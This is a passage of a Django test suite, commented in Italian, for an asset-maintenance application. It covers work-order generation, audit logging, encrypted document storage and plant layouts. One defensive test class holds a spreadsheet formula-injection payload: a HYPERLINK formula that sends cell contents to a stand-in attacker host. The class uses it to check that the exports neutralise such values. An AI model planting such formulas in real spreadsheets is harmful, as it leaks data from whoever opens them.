        self.assertEqual(
            WorkOrder.objects.filter(asset=self.asset, maintenance_rule=self.rule).count(),
            1,
            "Il generatore ha ricreato un OdL per una manutenzione appena eseguita.",
        )
        self.assertFalse(
            WorkOrder.objects.filter(
                asset=self.asset, maintenance_rule=self.rule, origin=WorkOrder.ORIGIN_PERIODIC
            ).exists()
        )

    def test_generator_still_creates_when_the_last_execution_is_old(self):
        self._record_execution_from_schedule(
            executed_on=timezone.localdate() - timedelta(days=200)
        )

        call_command("generate_scheduled_workorders", stdout=io.StringIO())

        self.assertTrue(
            WorkOrder.objects.filter(
                asset=self.asset, maintenance_rule=self.rule, origin=WorkOrder.ORIGIN_PERIODIC
            ).exists()
        )

    def test_generator_sees_history_recorded_without_a_workorder(self):
        # Storico manuale: lo stato è valorizzato ma non esiste alcun OdL da interrogare.
        upsert_asset_maintenance_rule_state(
            asset=self.asset,
            base_rule=self.rule,
            executed_on=timezone.localdate(),
        )

        call_command("generate_scheduled_workorders", stdout=io.StringIO())

        self.assertEqual(WorkOrder.objects.filter(asset=self.asset, maintenance_rule=self.rule).count(), 0)


@override_settings(LEGACY_AUTH_ENABLED=False, SECURE_SSL_REDIRECT=False)
class AssetMeterAuditTests(TestCase):
    """S4 — l'audit dell'aggiornamento contatori si perdeva in silenzio (firma di log_action sbagliata)."""

    def setUp(self):
        User = get_user_model()
        self.user = User.objects.create_user("meter-audit", "meter-audit@test.local", "pw")
        _complete_onboarding(self.user)
        self.category = AssetCategory.objects.create(
            code="cnc-audit", label="CNC audit", base_asset_type=Asset.TYPE_CNC, sort_order=10,
        )
        self.asset = Asset.objects.create(
            asset_tag="CNC-AUD-001",
            name="Tornio audit",
            asset_type=Asset.TYPE_CNC,
            asset_category=self.category,
            status=Asset.STATUS_IN_USE,
        )
        self.meter = AssetMeter.objects.create(
            asset=self.asset, meter_type=AssetMeter.METER_HOURS, current_value=100, unit_label="h",
        )

    def _audit_rows(self):
        from core.models import AuditLog

        return AuditLog.objects.filter(azione="asset_meter_update")

    def test_meter_update_is_audited(self):
        self.client.force_login(self.user)

        response = self.client.post(
            reverse("assets:asset_meter_update", args=[self.asset.id]),
            {"meter_id": str(self.meter.id), "new_value": "480"},
        )

        self.assertEqual(response.status_code, 200)
        entry = self._audit_rows().get()
        self.assertEqual(entry.modulo, "assets")
        self.assertEqual(entry.dettaglio["asset_tag"], "CNC-AUD-001")
        self.assertEqual(Decimal(entry.dettaglio["old_value"]), Decimal("100"))
        self.assertEqual(Decimal(entry.dettaglio["new_value"]), Decimal("480"))
        self.assertEqual(entry.dettaglio["meter_type"], AssetMeter.METER_HOURS)

    def test_invalid_meter_update_is_not_audited(self):
        self.client.force_login(self.user)

        self.client.post(
            reverse("assets:asset_meter_update", args=[self.asset.id]),
            {"meter_id": str(self.meter.id), "new_value": "non-un-numero"},
        )

        self.assertEqual(self._audit_rows().count(), 0)
        self.meter.refresh_from_db()
        self.assertEqual(self.meter.current_value, Decimal("100.00"))


class MaintenanceGeneratorDedupTests(TestCase):
    """Il dedup del generatore deve chiedersi «c'è già lavoro pendente su questa regola?»,
    non «chi ha creato l'OdL»: filtrare per origin=PERIODIC è un proxy sbagliato."""

    def setUp(self):
        User = get_user_model()
        self.admin = User.objects.create_superuser("dedup-admin", "dedup-admin@test.local", "pw")
        self.category = AssetCategory.objects.create(
            code="cnc-dedup", label="CNC dedup", base_asset_type=Asset.TYPE_CNC, sort_order=10,
        )
        self.template = MaintenanceInterventionTemplate.objects.create(
            code="lubrificazione-dedup", label="Lubrificazione", asset_category=self.category,
        )
        self.rule = MaintenanceRule.objects.create(
            intervention_template=self.template,
            asset_category=self.category,
            threshold_type=MaintenanceRule.THRESHOLD_DAYS,
            threshold_value=90,
            warning_days=15,
        )
        self.asset = Asset.objects.create(
            asset_tag="CNC-DED-001",
            name="Tornio dedup",
            asset_type=Asset.TYPE_CNC,
            asset_category=self.category,
            status=Asset.STATUS_IN_USE,
        )
        self.client.force_login(self.admin)

    def _open_manual_workorder(self) -> WorkOrder:
        """Percorso reale: apertura di un intervento dal form, collegato alla regola."""
        response = self.client.post(
            reverse("assets:wo_create", args=[self.asset.id]),
            {
                "periodic_verification": "",
                "maintenance_rule": str(self.rule.id),
                "supplier": "",
                "kind": WorkOrder.KIND_PREVENTIVE,
                "status": WorkOrder.STATUS_OPEN,
                "title": "Lubrificazione aperta a mano",
                "description": "Il manutentore l'ha gia' presa in carico.",
                "resolution": "",
                "downtime_minutes": "0",
                "cost_eur": "",
            },
        )
        self.assertEqual(response.status_code, 302)
        workorder = WorkOrder.objects.get(asset=self.asset, maintenance_rule=self.rule)
        self.assertEqual(workorder.origin, WorkOrder.ORIGIN_MANUAL)
        self.assertEqual(workorder.status, WorkOrder.STATUS_OPEN)
        return workorder

    def _periodic_workorders(self):
        return WorkOrder.objects.filter(
            asset=self.asset, maintenance_rule=self.rule, origin=WorkOrder.ORIGIN_PERIODIC
        )

    def test_open_manual_workorder_blocks_the_generator(self):
        self._open_manual_workorder()

        call_command("generate_scheduled_workorders", stdout=io.StringIO())

        self.assertFalse(
            self._periodic_workorders().exists(),
            "Il generatore ha aperto un OdL periodico accanto a uno manuale gia' aperto sulla stessa regola.",
        )
        self.assertEqual(WorkOrder.objects.filter(asset=self.asset, maintenance_rule=self.rule).count(), 1)

    def test_closed_manual_workorder_releases_the_rule(self):
        workorder = self._open_manual_workorder()

        response = self.client.post(
            reverse("assets:wo_close", args=[workorder.id]),
            {"status": WorkOrder.STATUS_CANCELED, "resolution": "Annullato: non serviva."},
        )
        self.assertEqual(response.status_code, 302)
        workorder.refresh_from_db()
        self.assertNotEqual(workorder.status, WorkOrder.STATUS_OPEN)

        call_command("generate_scheduled_workorders", stdout=io.StringIO())

        # Nessun lavoro pendente e nessuna esecuzione registrata: il generatore deve ripartire.
        self.assertTrue(self._periodic_workorders().exists())

    def test_open_periodic_workorder_is_not_duplicated(self):
        call_command("generate_scheduled_workorders", stdout=io.StringIO())
        self.assertEqual(self._periodic_workorders().count(), 1)

        call_command("generate_scheduled_workorders", stdout=io.StringIO())

        self.assertEqual(self._periodic_workorders().count(), 1)


class ReportOriginProxyDamageTests(TestCase):
    """Il comando di ricognizione deve vedere il danno che il bug 'origin come proxy' ha lasciato."""

    def setUp(self):
        self.today = timezone.localdate()
        self.category = AssetCategory.objects.create(
            code="cnc-damage", label="CNC danno", base_asset_type=Asset.TYPE_CNC, sort_order=10,
        )
        self.template = MaintenanceInterventionTemplate.objects.create(
            code="lubrificazione-damage", label="Lubrificazione", asset_category=self.category,
        )
        self.day_rule = MaintenanceRule.objects.create(
            intervention_template=self.template,
            asset_category=self.category,
            threshold_type=MaintenanceRule.THRESHOLD_DAYS,
            threshold_value=90,
            warning_days=15,
        )
        self.asset = Asset.objects.create(
            asset_tag="CNC-DMG-001",
            name="Tornio danneggiato",
            asset_type=Asset.TYPE_CNC,
            asset_category=self.category,
            status=Asset.STATUS_IN_USE,
        )

    def _workorder(self, *, origin, status, opened_days_ago, closed_days_ago=None, rule=None, meter_at_close=None):
        workorder = WorkOrder.objects.create(
            asset=self.asset,
            maintenance_rule=rule or self.day_rule,
            origin=origin,
            kind=WorkOrder.KIND_PREVENTIVE,
            status=status,
            title="Intervento",
            meter_value_at_close=meter_at_close,
        )
        opened_at = timezone.now() - timedelta(days=opened_days_ago)
        closed_at = timezone.now() - timedelta(days=closed_days_ago) if closed_days_ago is not None else None
        WorkOrder.objects.filter(pk=workorder.pk).update(opened_at=opened_at, closed_at=closed_at)
        workorder.refresh_from_db()
        return workorder

    def _run(self):
        out = io.StringIO()
        call_command("report_origin_proxy_damage", "--limit", "0", stdout=out)
        return out.getvalue()

    def test_reports_periodic_workorder_generated_right_after_a_manual_execution(self):
        self._workorder(
            origin=WorkOrder.ORIGIN_MANUAL,
            status=WorkOrder.STATUS_DONE,
            opened_days_ago=10,
            closed_days_ago=10,
        )
        spurious = self._workorder(
            origin=WorkOrder.ORIGIN_PERIODIC,
            status=WorkOrder.STATUS_OPEN,
            opened_days_ago=5,
        )

        output = self._run()

        self.assertIn("OdL periodici sospetti: 1", output)
        self.assertIn(f"#{spurious.pk}", output)
        self.assertIn("generato con", output)
        self.assertIn("gg di anticipo", output)

    def test_reports_periodic_workorder_opened_next_to_an_open_manual_one(self):
        self._workorder(origin=WorkOrder.ORIGIN_MANUAL, status=WorkOrder.STATUS_OPEN, opened_days_ago=20)
        self._workorder(origin=WorkOrder.ORIGIN_PERIODIC, status=WorkOrder.STATUS_OPEN, opened_days_ago=10)

        output = self._run()

        self.assertIn("OdL periodici sospetti: 1", output)
        self.assertIn("era già aperto", output)

    def test_reports_meter_consumption_computed_on_a_zero_baseline(self):
        meter_rule = MaintenanceRule.objects.create(
            intervention_template=self.template,
            asset_category=self.category,
            threshold_type=MaintenanceRule.THRESHOLD_HOURS,
            threshold_value=500,
            warning_days=50,
        )
        AssetMeter.objects.create(
            asset=self.asset, meter_type=AssetMeter.METER_HOURS, current_value=1300, unit_label="h",
        )
        executed = self._workorder(
            origin=WorkOrder.ORIGIN_MANUAL,
            status=WorkOrder.STATUS_DONE,
            opened_days_ago=30,
            closed_days_ago=30,
            rule=meter_rule,
            meter_at_close=1000,
        )
        AssetMaintenanceRuleState.objects.create(
            asset=self.asset,
            base_rule=meter_rule,
            last_execution_date=self.today - timedelta(days=30),
            last_work_order=executed,
        )

        output = self._run()

        self.assertIn("Consumi contatore calcolati su baseline 0: 1", output)
        self.assertIn("SCATTO FALSO", output)
        self.assertIn("consumo calcolato dal bug: 1300", output)
        self.assertIn("consumo reale: 300", output)


class AssetXlsxFormulaInjectionTests(TestCase):
    """Formula injection negli export .xlsx del modulo assets.

    Nome/note/descrizioni degli asset sono testo libero: openpyxl scriverebbe
    come formula viva ('f') qualunque stringa che inizia con "=" (o + - @),
    valutata all'apertura in Excel. Devono restare testo. Dati sintetici.
    """

    EVIL = '=HYPERLINK("http://evil.test?d="&A2,"clicca")'

    def setUp(self):
        self.user = get_user_model().objects.create_superuser(
            username="asset-xlsx-injection",
            email="asset-xlsx-injection@example.invalid",
            password="pwd12345",
        )
        self.client.force_login(self.user)
        self.asset = Asset.objects.create(
            asset_tag="EVIL-001",
            name=self.EVIL,
            asset_type=Asset.TYPE_WORK_MACHINE,
            reparto="@SUM(A1)",
            notes="+1+1",
            source_key="manual-xlsx-injection",
        )

    def _cells(self, content):
        workbook = load_workbook(io.BytesIO(content))
        try:
            for sheet in workbook.worksheets:
                for row in sheet.iter_rows():
                    for cell in row:
                        yield sheet.title, cell
        finally:
            workbook.close()

    def _assert_no_live_formula(self, response):
        self.assertEqual(response.status_code, 200)
        self.assertIn("spreadsheetml", response["Content-Type"])
        values = []
        for title, cell in self._cells(response.content):
            self.assertNotEqual(
                cell.data_type, "f",
                f"{title}!{cell.coordinate} = {cell.value!r} scritta come formula",
            )
            values.append(cell.value)
        self.assertIn(self.EVIL, values)  # il valore c'e', ma come testo

    def test_asset_list_export_xlsx_has_no_live_formula(self):
        response = self.client.get(reverse("assets:asset_list_export"), {"format": "xlsx"})
        self._assert_no_live_formula(response)

    def test_work_machine_export_excel_has_no_live_formula(self):
        response = self.client.get(reverse("assets:work_machine_export_excel"))
        self._assert_no_live_formula(response)

    def test_asset_detail_export_xlsx_has_no_live_formula(self):
        response = self.client.get(
            reverse("assets:asset_detail_export_xlsx", args=[self.asset.id])
        )
        self._assert_no_live_formula(response)

    def test_workorder_export_xlsx_has_no_live_formula(self):
        WorkOrder.objects.create(
            asset=self.asset,
            title=self.EVIL,
            description="-2+3",
            kind=WorkOrder.KIND_CORRECTIVE,
        )
        response = self.client.get(
            reverse("assets:workorder_list_export"), {"format": "xlsx", "scope": "full"}
        )
        self._assert_no_live_formula(response)

    def test_export_still_typed_and_intact_for_benign_values(self):
        """Non-regressione: intestazioni, valori legittimi e stili restano invariati."""
        response = self.client.get(reverse("assets:work_machine_export_excel"))
        self.assertEqual(response.status_code, 200)
        workbook = load_workbook(io.BytesIO(response.content))
        try:
            sheet = workbook["Macchine officina"]
            self.assertEqual(sheet["A1"].value, "Tag")
            self.assertTrue(sheet["A1"].font.bold)  # stile intestazione preservato
            self.assertEqual(sheet["A2"].value, "EVIL-001")
            self.assertEqual(sheet["A2"].data_type, "s")
            self.assertFalse(sheet["A2"].quotePrefix)  # valore benigno: nessun quote prefix
        finally:
            workbook.close()


class AssetPrivateMediaStorageWiringTests(TestCase):
    """I documenti asset e gli allegati OdL devono usare lo storage privato cifrato
    (ASSETS_PRIVATE_ROOT), come gia' fanno le scadenze — non lo storage di default su
    MEDIA_ROOT. Regressione del 404 in produzione: i file cifrati vivono in media_private/
    ma i campi li cercavano in media/, quindi il download non li trovava. Dati sintetici.
    """

    def _key(self):
        from cryptography.fernet import Fernet

        return Fernet.generate_key().decode()

    def test_asset_document_stored_encrypted_in_private_root_and_served_via_qr(self):
        from .models import AssetDocument

        asset = Asset.objects.create(
            asset_tag="AST-DOCPRIV-1",
            name="Doc privato",
            asset_type=Asset.TYPE_WORK_MACHINE,
            source_key="manual-docpriv-1",
        )
        with (
            _workspace_temporary_directory("assets-media-") as media_root,
            _workspace_temporary_directory("assets-private-") as private_root,
            override_settings(
                MEDIA_ROOT=media_root,
                ASSETS_PRIVATE_ROOT=private_root,
                DOCUMENT_ENCRYPTION_KEY=self._key(),
            ),
        ):
            doc = AssetDocument.objects.create(
                asset=asset,
                category=AssetDocument.CATEGORY_MANUALI,
                file=SimpleUploadedFile("manuale.pdf", b"%PDF-1.4 corpo manuale", content_type="application/pdf"),
                original_name="manuale.pdf",
            )
            on_disk = Path(private_root) / doc.file.name
            self.assertTrue(on_disk.exists(), "il documento deve stare nell'area privata")
            self.assertFalse((Path(media_root) / doc.file.name).exists(), "non deve stare in MEDIA_ROOT")
            self.assertTrue(on_disk.read_bytes().startswith(b"NCENC1\n"), "deve essere cifrato at-rest")

            resp = self.client.get(
                reverse(
                    "assets:asset_document_qr_download",
                    kwargs={"public_qr_token": asset.public_qr_token, "document_id": doc.id},
                )
            )
            self.assertEqual(resp.status_code, 200)
            self.assertEqual(b"".join(resp.streaming_content), b"%PDF-1.4 corpo manuale")

    def test_workorder_attachment_stored_encrypted_in_private_root(self):
        from .models import WorkOrder, WorkOrderAttachment

        asset = Asset.objects.create(
            asset_tag="AST-WOPRIV-1",
            name="OdL privato",
            asset_type=Asset.TYPE_WORK_MACHINE,
            source_key="manual-wopriv-1",
        )
        wo = WorkOrder.objects.create(asset=asset, title="OdL con allegato", kind=WorkOrder.KIND_CORRECTIVE)
        with (
            _workspace_temporary_directory("assets-media-") as media_root,
            _workspace_temporary_directory("assets-private-") as private_root,
            override_settings(
                MEDIA_ROOT=media_root,
                ASSETS_PRIVATE_ROOT=private_root,
                DOCUMENT_ENCRYPTION_KEY=self._key(),
            ),
        ):
            att = WorkOrderAttachment.objects.create(
                work_order=wo,
                file=SimpleUploadedFile("rapporto.pdf", b"%PDF-1.4 rapporto intervento", content_type="application/pdf"),
            )
            on_disk = Path(private_root) / att.file.name
            self.assertTrue(on_disk.exists(), "l'allegato OdL deve stare nell'area privata")
            self.assertFalse((Path(media_root) / att.file.name).exists(), "non deve stare in MEDIA_ROOT")
            self.assertTrue(on_disk.read_bytes().startswith(b"NCENC1\n"), "deve essere cifrato at-rest")
            self.assertTrue(att.file.storage.exists(att.file.name))
            with att.file.storage.open(att.file.name, "rb") as fh:
                self.assertEqual(fh.read(), b"%PDF-1.4 rapporto intervento")


@override_settings(LEGACY_AUTH_ENABLED=False, SECURE_SSL_REDIRECT=False)
class AssetPlantLayoutResolveTests(TestCase):
    """La 'posizione in officina' usa la planimetria reale del reparto dell'asset."""

    def test_marker_goes_to_layout_matching_asset_reparto(self):
        with _workspace_temporary_directory("assets-resolve-") as tmpdir, override_settings(MEDIA_ROOT=Path(tmpdir)):
            officina = PlantLayout.objects.create(
                category="Officina", name="Officina", image=_valid_png_upload("o.png"), is_active=True
            )
            cromatura = PlantLayout.objects.create(
                category="Reparto Cromatura", name="Cromatura", image=_valid_png_upload("c.png"), is_active=True
            )
            asset = Asset.objects.create(asset_tag="AST-CROM-1", name="Vasca cromatura", reparto="Reparto Cromatura")
            msg = asset_views._ensure_asset_plant_layout_marker(asset)
            self.assertEqual(msg, "")
            marker = PlantLayoutMarker.objects.get(asset=asset)
            # Sul layout del reparto, NON sull'alfabeticamente primo (Officina).
            self.assertEqual(marker.layout_id, cromatura.id)
            self.assertNotEqual(marker.layout_id, officina.id)

    def test_marker_resolves_via_area_reparto_code(self):
        with _workspace_temporary_directory("assets-resolve-area-") as tmpdir, override_settings(MEDIA_ROOT=Path(tmpdir)):
            officina = PlantLayout.objects.create(
                category="Officina", name="Officina", image=_valid_png_upload("o.png"), is_active=True
            )
            # Category "Zincatura" viene DOPO "Officina": il fallback sceglierebbe Officina.
            zincatura = PlantLayout.objects.create(
                category="Zincatura", name="Zincatura", image=_valid_png_upload("z.png"), is_active=True
            )
            PlantLayoutArea.objects.create(layout=zincatura, name="Zona Nichel", reparto_code="Nichelatura")
            asset = Asset.objects.create(asset_tag="AST-NIC-1", name="Impianto nichel", reparto="Nichelatura")
            asset_views._ensure_asset_plant_layout_marker(asset)
            marker = PlantLayoutMarker.objects.get(asset=asset)
            self.assertEqual(marker.layout_id, zincatura.id)
            self.assertNotEqual(marker.layout_id, officina.id)

    def test_marker_falls_back_to_first_active_layout_when_reparto_unmapped(self):
        with _workspace_temporary_directory("assets-resolve-fb-") as tmpdir, override_settings(MEDIA_ROOT=Path(tmpdir)):
            officina = PlantLayout.objects.create(
                category="Officina", name="Officina", image=_valid_png_upload("o.png"), is_active=True
            )
            PlantLayout.objects.create(
                category="TVCC", name="TVCC", image=_valid_png_upload("t.png"), is_active=True
            )
            asset = Asset.objects.create(asset_tag="AST-FB-1", name="Macchina orfana", reparto="Reparto Inesistente")
            msg = asset_views._ensure_asset_plant_layout_marker(asset)
            self.assertEqual(msg, "")
            marker = PlantLayoutMarker.objects.get(asset=asset)
            # Fallback: primo layout attivo per (category, name, id) = Officina.
            self.assertEqual(marker.layout_id, officina.id)

    def test_no_active_layout_returns_message_without_marker(self):
        asset = Asset.objects.create(asset_tag="AST-NONE-1", name="Nessuna piantina", reparto="Officina")
        msg = asset_views._ensure_asset_plant_layout_marker(asset)
        self.assertIn("nessuna planimetria attiva", msg.lower())
        self.assertFalse(PlantLayoutMarker.objects.filter(asset=asset).exists())

    def test_existing_marker_is_moved_to_reparto_layout(self):
        with _workspace_temporary_directory("assets-resolve-move-") as tmpdir, override_settings(MEDIA_ROOT=Path(tmpdir)):
            officina = PlantLayout.objects.create(
                category="Officina", name="Officina", image=_valid_png_upload("o.png"), is_active=True
            )
            cromatura = PlantLayout.objects.create(
                category="Reparto Cromatura", name="Cromatura", image=_valid_png_upload("c.png"), is_active=True
            )
            asset = Asset.objects.create(asset_tag="AST-MOVE-1", name="Vasca", reparto="Reparto Cromatura")
            # Marker preesistente sul layout SBAGLIATO (Officina).
            PlantLayoutMarker.objects.create(layout=officina, asset=asset, label="vecchio", x_percent=10, y_percent=10)
            msg = asset_views._ensure_asset_plant_layout_marker(asset)
            self.assertEqual(msg, "")
            markers = PlantLayoutMarker.objects.filter(asset=asset)
            self.assertEqual(markers.count(), 1)
            self.assertEqual(markers.first().layout_id, cromatura.id)


@override_settings(LEGACY_AUTH_ENABLED=False, SECURE_SSL_REDIRECT=False)
class AssetPart145ModelTests(TestCase):
    """Flag PART 145 sull'asset: si salva e si legge, default False."""

    def test_part_145_defaults_false(self):
        asset = Asset.objects.create(asset_tag="AST-P145-DEF", name="Macchina normale")
        asset.refresh_from_db()
        self.assertFalse(asset.part_145)

    def test_part_145_persists_true(self):
        asset = Asset.objects.create(asset_tag="AST-P145-ON", name="Macchina PART 145", part_145=True)
        asset.refresh_from_db()
        self.assertTrue(asset.part_145)


@override_settings(LEGACY_AUTH_ENABLED=False, SECURE_SSL_REDIRECT=False)
class AssetPart145FormTests(TestCase):
    """Il flag PART 145 è esposto nei form di creazione/modifica asset."""

    def test_asset_form_exposes_part_145(self):
        from assets.forms import AssetForm

        self.assertIn("part_145", AssetForm.Meta.fields)

    def test_work_machine_form_exposes_part_145(self):
        from assets.forms import WorkMachineAssetForm

        self.assertIn("part_145", WorkMachineAssetForm.Meta.fields)


@override_settings(LEGACY_AUTH_ENABLED=False, SECURE_SSL_REDIRECT=False)
class AssetTimelineManualEntryTests(TestCase):
    """Voci inserite a mano nella timeline di vita della scheda asset."""

    def setUp(self):
        self.category = AssetCategory.objects.create(code="tl-cat", label="Presse", is_active=True)
        self.asset = Asset.objects.create(
            asset_tag="AST-TL-001",
            name="Pressa timeline",
            asset_type=Asset.TYPE_WORK_MACHINE,
            asset_category=self.category,
            source_key="manual-tl-001",
        )
        self.admin = User.objects.create_superuser(
            username="asset-timeline-admin",
            email="asset-timeline-admin@test.local",
            password="pass12345",
        )
        _complete_onboarding(self.admin)
        self.viewer = User.objects.create_user(username="asset-timeline-viewer", password="pass12345")
        _complete_onboarding(self.viewer)

    def _post_entry(self, **overrides):
        payload = {
            "action": "add_asset_timeline_entry",
            "timeline_date": "2026-03-14",
            "timeline_title": "Fermo macchina per revisione",
            "timeline_tag": "fermo",
            "timeline_meta": "Officina esterna",
            "timeline_description": "Revisione straordinaria eseguita dal costruttore.",
            "timeline_color": AssetTimelineEntry.COLOR_AMBER,
        }
        payload.update(overrides)
        return self.client.post(reverse("assets:asset_view", args=[self.asset.id]), payload)

    def test_manager_adds_entry_and_sees_it_in_timeline(self):
        self.client.force_login(self.admin)
        response = self._post_entry()

        self.assertEqual(response.status_code, 302)
        entry = AssetTimelineEntry.objects.get(asset=self.asset)
        self.assertEqual(entry.event_date, date(2026, 3, 14))
        self.assertEqual(entry.tag, "FERMO")
        self.assertEqual(entry.color, AssetTimelineEntry.COLOR_AMBER)
        self.assertEqual(entry.created_by, self.admin)

        page = self.client.get(reverse("assets:asset_view", args=[self.asset.id]))
        self.assertEqual(page.status_code, 200)
        body = page.content.decode("utf-8")
        self.assertIn("Fermo macchina per revisione", body)
        self.assertIn("add_asset_timeline_entry", body)

    def test_entry_requires_title_and_valid_date(self):
        self.client.force_login(self.admin)

        self._post_entry(timeline_title="")
        self._post_entry(timeline_date="")
        self._post_entry(timeline_date="14/03/2026")

        self.assertFalse(AssetTimelineEntry.objects.filter(asset=self.asset).exists())

    def test_non_manager_cannot_add_or_see_the_button(self):
        self.client.force_login(self.viewer)

        response = self._post_entry()
        self.assertEqual(response.status_code, 302)
        self.assertFalse(AssetTimelineEntry.objects.filter(asset=self.asset).exists())

        page = self.client.get(reverse("assets:asset_view", args=[self.asset.id]))
        self.assertEqual(page.status_code, 200)
        self.assertNotIn("add_asset_timeline_entry", page.content.decode("utf-8"))

    def test_category_toggle_disables_manual_entries(self):
        self.category.detail_timeline_manual_enabled = False
        self.category.save(update_fields=["detail_timeline_manual_enabled"])
        self.client.force_login(self.admin)

        response = self._post_entry()
        self.assertEqual(response.status_code, 302)
        self.assertFalse(AssetTimelineEntry.objects.filter(asset=self.asset).exists())

        page = self.client.get(reverse("assets:asset_view", args=[self.asset.id]))
        self.assertNotIn("add_asset_timeline_entry", page.content.decode("utf-8"))
